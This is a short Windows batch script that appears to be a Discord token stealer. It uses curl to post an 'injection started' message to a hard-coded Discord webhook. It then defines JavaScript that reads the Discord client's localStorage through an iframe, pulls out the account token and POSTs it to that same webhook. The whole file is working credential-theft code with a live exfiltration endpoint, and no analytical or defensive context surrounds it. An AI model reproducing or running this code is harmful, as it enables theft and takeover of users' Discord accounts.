@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" https://discord.com/api/webhooks/769413473477722143/IKim6rDCsg794DuN2zUdCT_zva0rJKRF9XGKNVpagdChf1ByVVkqqkI6frDopM88uf8d
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/769413473477722143/IKim6rDCsg794DuN2zUdCT_zva0rJKRF9XGKNVpagdChf1ByVVkqqkI6frDopM88uf8d', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
